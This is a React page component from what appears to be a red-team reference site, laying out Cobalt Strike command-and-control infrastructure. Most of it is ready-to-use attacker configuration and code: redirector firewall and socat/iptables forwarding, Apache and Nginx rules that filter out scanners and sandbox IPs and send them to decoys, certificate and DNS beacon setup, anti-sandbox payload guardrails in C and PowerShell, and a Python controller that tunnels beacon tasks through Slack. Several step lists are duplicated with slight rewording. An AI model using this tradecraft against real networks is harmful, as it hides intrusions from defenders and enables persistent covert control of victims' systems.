import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'INFRASTRUCTURE',
    color: 'purple',
    nodes: [
      { title: 'Defence in Depth', subtitle: 'Infrastructure design • layers', id: 'defence-depth' },
      { title: 'Apache HTTPS Redirect', subtitle: 'SSL certs • SSH tunnel • mod_rewrite', id: 'apache' },
    ]
  },
  {
    header: 'TRAFFIC CONTROL',
    color: 'blue',
    nodes: [
      { title: 'Traffic Rules', subtitle: 'UA • Cookie • URI/Query filters', id: 'traffic-rules' },
      { title: 'Beacon Certificates', subtitle: 'Custom TLS • staging • DNS redirect', id: 'beacon-certs' },
    ]
  },
  {
    header: 'PAYLOAD & CHANNELS',
    color: 'cyan',
    nodes: [
      { title: 'Payload Guardrails', subtitle: 'Environment keying • anti-sandbox', id: 'guardrails' },
      { title: 'External C2', subtitle: 'Third-party channels • custom comms', id: 'external-c2' },
    ]
  },
];

const techniques = [
  {
    id: 'defence-depth',
    title: 'C2 Infrastructure — Defence in Depth Design',
    subtitle: 'Layer infrastructure components so a single detection doesn\'t burn the entire operation',
    tags: ['infrastructure design', 'redirectors', 'compartmentalization', 'team server isolation'],
    accentColor: 'purple',
    overview: 'C2 infrastructure must be layered so that burning a redirector never reveals the team server. Every component has a single role — no IP or domain should serve dual purposes across an engagement.',
    steps: [
      'Never expose the team server directly — all beacon traffic must pass through at least one redirector',
      'Redirector chain: beacon → CDN → redirector VPS → team server (not publicly reachable)',
      'Separate redirector IPs/domains for: payload hosting, phishing, and C2 callbacks',
      'If the redirector gets burned: swap it out — team server IP is never revealed to targets',
      'Firewall team server: only accept connections from redirector IPs on the C2 port',
      'Use separate VPS providers per role — reduces single point of failure from provider abuse takedowns',
    ],
    commands: [
      {
        title: 'Infrastructure design and firewall rules',
        code: `# Team server firewall: only accept from redirector
# UFW (on team server)
ufw default deny incoming
ufw allow from <REDIRECTOR_IP> to any port 443   # Only redirector can reach TS
ufw allow from <OPERATOR_IP> to any port 50050   # CS team server port — operator only
ufw allow from <OPERATOR_IP> to any port 22      # SSH — operator only
ufw --force enable

# iptables equivalent
iptables -A INPUT -p tcp --dport 443 -s <REDIRECTOR_IP> -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j DROP   # Drop all others on 443

# Redirector: forward beacon traffic to team server
# socat
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:<TEAMSERVER_IP>:443 &

# iptables NAT redirect
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination <TEAMSERVER_IP>:443
iptables -t nat -A POSTROUTING -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

# Infrastructure documentation
echo "
TeamServer: <TS_IP> (DO NYC, not publicly routable)
Redirector:  <RD_IP> (Vultr Frankfurt, port 443 open)
Domain:      <DOMAIN>.com → Redirector A record
" > infra_map.txt`
      }
    ]
  },
  {
    id: 'apache',
    title: 'Apache HTTPS Redirector with mod_rewrite',
    subtitle: 'Build a filtering HTTPS redirector that forwards only beacon traffic to the team server',
    tags: ['Apache', 'mod_rewrite', 'SSL', 'Let\'s Encrypt', 'SSH tunnel', 'smart redirect'],
    accentColor: 'purple',
    overview: 'An Apache redirector sits between beacons and the team server, filtering out scanners and analysts. Only traffic matching URI, User-Agent, and cookie patterns is forwarded — everything else gets a decoy response.',
    steps: [
      'Provision a clean VPS on a different provider than the team server',
      'Install Apache and enable mod_rewrite, mod_proxy, and mod_ssl',
      'Obtain a Let\'s Encrypt certificate for the callback domain',
      'Create an SSH tunnel from the redirector to the team server so the TS needs no public port',
      'Write mod_rewrite rules: forward only requests matching the beacon URI and User-Agent — redirect everything else to a decoy',
      'Block known AV/sandbox IP ranges at the redirector before forwarding rules are evaluated',
      'Obtain SSL certificate with Let\'s Encrypt for the callback domain',
      'Configure SSH tunnel from redirector to team server so team server doesn\'t need to be internet-accessible',
      'Write mod_rewrite rules: only forward requests with correct URI + User-Agent to team server; send everything else to a decoy page',
      'Block known sandbox/AV IP ranges on the redirector to prevent analysis',
      'Log all incoming requests for burn detection',
    ],
    commands: [
      {
        title: 'Apache redirector configuration',
        code: `# Install Apache + SSL
apt install apache2 libapache2-mod-ssl certbot python3-certbot-apache -y
a2enmod rewrite proxy proxy_http ssl headers
certbot --apache -d yourdomain.com

# SSH tunnel to team server (beacon traffic via SSH — TS not exposed)
# On redirector:
ssh -N -R 8443:localhost:443 root@<TEAMSERVER_IP> &
# Traffic from port 443 gets forwarded via SSH to TS port 443

# /etc/apache2/sites-available/redirector.conf
<VirtualHost *:443>
    ServerName yourdomain.com
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/yourdomain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/yourdomain.com/privkey.pem

    RewriteEngine On
    RewriteCond %{REQUEST_METHOD} ^(GET|POST)$

    # Block known bad User-Agents
    RewriteCond %{HTTP_USER_AGENT} ^(curl|Wget|python|Go-http-client|masscan|nmap) [NC]
    RewriteRule .* https://microsoft.com/? [L,R=302]

    # Only forward beacon URIs + correct User-Agent
    RewriteCond %{REQUEST_URI} ^(/owa/service\.svc|/api/v1/telemetry|/update/check) [OR]
    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows NT 10\.0; Win64; x64\)" [NC]
    RewriteRule ^(.*)$ https://localhost:8443%{REQUEST_URI} [P,L]

    # Decoy for everything else
    RewriteRule .* /var/www/html/decoy.html [L]
</VirtualHost>

a2ensite redirector
systemctl reload apache2`
      }
    ]
  },
  {
    id: 'traffic-rules',
    title: 'Traffic Filtering Rules — User-Agent, Cookie, URI',
    subtitle: 'Configure redirector to only pass beacon traffic and block all other requests',
    tags: ['User-Agent filter', 'Cookie filter', 'URI filter', 'query string', 'redirector'],
    accentColor: 'blue',
    overview: 'Layered traffic rules at the redirector ensure that only genuine beacon traffic reaches the team server. Scanners, sandboxes, and analysts will hit decoy pages and never see the C2 infrastructure.',
    steps: [
      'Define the exact User-Agent string used by the beacon in the Malleable profile — block everything that does not match',
      'Add a URI allowlist: only forward requests to paths defined in the Malleable C2 profile',
      'Require a specific cookie value that only the beacon sends — scanners will lack it',
      'Block known AV and sandbox IP ranges with a RewriteCond on REMOTE_ADDR',
      'Test all filter rules before the engagement — send beacon traffic and scanner traffic and verify behaviour',
      'Cookie rules: check for a specific cookie value in the request — beacon always sends it, scanners won\'t',
      'URI rules: only forward requests matching specific URI patterns from the Malleable profile',
      'Query string rules: include a specific query parameter that only the beacon sends',
      'IP-based rules: whitelist target organization IP ranges (if known); block known security vendor IPs',
      'Test all filters before the engagement — beacon traffic must flow, but scanners must be blocked',
    ],
    commands: [
      {
        title: 'Multi-layer traffic filtering',
        code: `# Apache: combined URI + User-Agent + Cookie filter
RewriteEngine On

# Require specific URI
RewriteCond %{REQUEST_URI} !^(/api/v1/update|/owa/service\.svc|/ms/telemetry)
RewriteRule .* https://decoy.com/? [L,R=302]

# Require specific User-Agent (must match Malleable profile exactly)
RewriteCond %{HTTP_USER_AGENT} !"Mozilla/5.0 \(Windows NT 10\.0; Win64; x64\) Teams/1\.5" [NC]
RewriteRule .* https://decoy.com/? [L,R=302]

# Require a session cookie (beacon sends it, scanners won't have it)
RewriteCond %{HTTP_COOKIE} !MUID=
RewriteRule .* https://decoy.com/? [L,R=302]

# Block known bad IPs (AV/sandbox vendors)
RewriteCond %{REMOTE_ADDR} ^(54\.187\.|108\.170\.|216\.58\.)
RewriteRule .* https://decoy.com/? [L,R=302]

# Forward matching traffic to team server
RewriteRule ^(.*)$ https://localhost:8443%{REQUEST_URI} [P,L]

# Nginx equivalent
map $http_user_agent $bad_ua {
    default 0;
    ~*(curl|wget|python|bot) 1;
}
if ($bad_ua) { return 302 https://decoy.com/; }
if ($http_cookie !~ "MUID=") { return 302 https://decoy.com/; }`
      }
    ]
  },
  {
    id: 'beacon-certs',
    title: 'Beacon TLS Certificates & DNS Redirection',
    subtitle: 'Configure legitimate-looking TLS certificates for beacon HTTPS traffic',
    tags: ['Let\'s Encrypt', 'self-signed', 'TLS', 'Java keystore', 'DNS redirect', 'JARM'],
    accentColor: 'blue',
    overview: 'TLS certificates and DNS configuration control how beacon traffic appears to defenders. Using a Let\'s Encrypt cert and a categorised domain changes the JARM fingerprint away from the Cobalt Strike default.',
    steps: [
      'Obtain a Let\'s Encrypt certificate for the callback domain — never use self-signed (triggers TLS alerts)',
      'Convert the LE certificate to a Java keystore (.store) for use in the Malleable C2 profile',
      'Reference the keystore in the https-certificate block of the Malleable profile',
      'For DNS beacons: delegate a subdomain NS record to the team server IP via the domain registrar',
      'Configure the CS DNS listener with the delegated subdomain as the DNS Host',
      'Generate fresh domains and certificates per engagement — never reuse infrastructure',
      'Configure the Malleable C2 profile to use your certificate (Java keystore format for CS)',
      'DNS redirect for DNS beacon: configure authoritative NS records pointing to your team server',
      'Beacon staging over DNS: small shellcode stager contacts your DNS NS server for the full beacon',
      'JARM fingerprint: CS default JARM is in threat intel feeds — use LE cert to change it',
      'For each engagement: generate fresh domains and certificates — never reuse',
    ],
    commands: [
      {
        title: 'Certificate setup for Cobalt Strike',
        code: `# Let's Encrypt certificate for callback domain
certbot certonly --standalone -d yourdomain.com
# Certs in: /etc/letsencrypt/live/yourdomain.com/

# Convert LE cert to Java keystore (required for CS profile)
openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem \
  -out domain.p12 -name yourdomain.com -passout pass:password

keytool -importkeystore \
  -srckeystore domain.p12 -srcstoretype PKCS12 -srcstorepass password \
  -destkeystore domain.store -deststoretype JKS -deststorepass password

# Reference in Malleable C2 profile
https-certificate {
    set keystore "domain.store";
    set password "password";
}

# DNS redirect — configure at domain registrar
# For DNS C2 listener:
# ns1.yourdomain.com   A     <TEAMSERVER_IP>
# beacon.yourdomain.com NS   ns1.yourdomain.com

# CS DNS listener
Listeners → Add
  Payload: windows/beacon_dns/reverse_dns_txt
  DNS Hosts: beacon.yourdomain.com
  DNS Port: 53

# Verify DNS delegation
dig NS beacon.yourdomain.com
dig A ns1.yourdomain.com`
      }
    ]
  },
  {
    id: 'guardrails',
    title: 'Payload Guardrails',
    subtitle: 'Restrict payload execution to the target environment — useless if analyzed on sandbox',
    tags: ['guardrails', 'environment keying', 'anti-sandbox', 'domain check', 'IP check'],
    accentColor: 'cyan',
    overview: 'Payload guardrails prevent execution outside the target environment. A sandboxed analyst running the payload will exit harmlessly — the real payload only runs when all environmental checks pass.',
    steps: [
      'Check domain membership: verify the machine is joined to the target domain (CORP.LOCAL) before executing',
      'Check source IP range: only continue if the public IP matches the target organisation\'s known ranges',
      'Check system resources: exit if CPU cores < 2, RAM < 2GB, or uptime < 10 minutes (sandbox indicators)',
      'Check for analysis tools: exit if procmon, wireshark, vmtoolsd, or vboxservice are running',
      'Stack multiple checks: domain + IP + uptime + resource checks combined give high confidence of a real target',
      'Combine guardrails with redirector IP filtering: only target IPs can even download the stager',
      'Domain keying: only execute if the machine is joined to a specific domain (CORP.LOCAL)',
      'IP range keying: only execute if the source IP is within the target organization\'s IP range',
      'Username keying: only execute if the running user matches a known target employee',
      'Hostname keying: only execute on a specific machine (for very targeted operations)',
      'Combine multiple guardrails: domain + username + uptime check + mouse movement',
    ],
    commands: [
      {
        title: 'Payload guardrails implementation',
        code: `# Domain keying (C)
char domain[256]; DWORD size = 256;
GetComputerNameExA(ComputerNameDnsDomain, domain, &size);
if (_stricmp(domain, "corp.local") != 0) ExitProcess(0);

# PowerShell guardrail
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
if ($domain -ne "corp.local") { exit }

# IP range check (before execution)
$ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
if ($ip -notmatch "^203\.0\.113\.") { exit }   # Only execute from target IP range

# Sandbox detection (combine all checks)
if (
    (Get-CimInstance Win32_Processor).NumberOfCores -lt 2 -or   # CPU cores
    (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB -or   # RAM
    [System.Environment]::TickCount -lt 600000 -or  # Uptime < 10 min
    (Get-Process | Where-Object { $_.Name -in @("procmon","wireshark","vmtoolsd","vboxservice") })  # Analysis tools
) { exit }

# CS Malleable C2 profile guardrail (limit stager to specific hosts)
# Can be combined with redirector IP filtering
# Only IPs from the target IP range can download the stager from the redirector`
      }
    ]
  },
  {
    id: 'external-c2',
    title: 'External C2 — Custom Communication Channels',
    subtitle: 'Route C2 traffic through a third-party service or custom transport layer',
    tags: ['External C2', 'Slack', 'Dropbox', 'Twitter', 'custom transport', 'ExternalC2'],
    accentColor: 'cyan',
    overview: 'External C2 routes beacon traffic through a trusted SaaS platform (Slack, OneDrive, GitHub) so no C2 domain is needed. Traffic appears to DLP and proxy as normal SaaS usage.',
    steps: [
      'Start an External C2 listener on the team server (binds on localhost:2222)',
      'Deploy the External C2 controller on the attacker\'s machine — it connects to the TS socket and translates traffic',
      'On the target, deploy an External C2 client that communicates with the controller via the chosen SaaS channel',
      'Beacon tasks are posted as messages to the SaaS channel; the client polls and processes them',
      'Route results back from the target through the SaaS channel to the controller and then to the TS',
      'Use for heavily filtered egress environments only — latency is high; not suitable for interactive operations',
      'Use legitimate platforms (Slack, Teams, OneDrive, GitHub) as the C2 transport — extremely trusted by firewalls',
      'External C2 controller: an intermediary process on the attacker\'s network translates external comms to CS Beacon protocol',
      'Beacon sends tasks/results via the external service (e.g., posts to a Slack channel)',
      'Very stealthy: no C2 domain needed, traffic appears as SaaS app usage to DLP/proxy',
      'Much slower than HTTPS C2 — use for specific scenarios (heavily filtered egress, long-term persistence)',
    ],
    commands: [
      {
        title: 'External C2 setup concept',
        code: `# CS External C2 architecture:
# Beacon → ExternalC2 Client (on target) → [Slack/Teams/OneDrive] → ExternalC2 Controller (attacker) → CS Team Server

# CS Team Server: start External C2 listener
# Listeners → Add → External C2
# Binds on port 2222 (localhost) waiting for controller

# External C2 Controller (Python example concept)
import socket, requests, time

cs_socket = socket.create_connection(("127.0.0.1", 2222))

while True:
    # Receive task from CS
    task_size = int.from_bytes(cs_socket.recv(4), 'little')
    task = cs_socket.recv(task_size)
    
    # Post task to Slack channel (beacon reads from channel)
    requests.post("https://slack.com/api/chat.postMessage",
        headers={"Authorization": f"Bearer {SLACK_TOKEN}"},
        json={"channel": "CHANNEL_ID", "text": task.hex()})
    
    # Poll Slack for beacon's response
    time.sleep(5)
    resp = requests.get("https://slack.com/api/conversations.history",
        headers={"Authorization": f"Bearer {SLACK_TOKEN}"},
        params={"channel": "CHANNEL_ID", "limit": 1})
    
    # Forward response to CS
    response_data = bytes.fromhex(resp.json()["messages"][0]["text"])
    cs_socket.send(len(response_data).to_bytes(4, 'little') + response_data)

# On target: External C2 client reads from Slack, writes to CS beacon named pipe`
      }
    ]
  },
];

export default function C2Infrastructure() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">C2 </span><span className="text-purple-400">Infrastructure</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Defence in Depth • Apache Redirectors • Traffic Rules • Guardrails • External C2</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}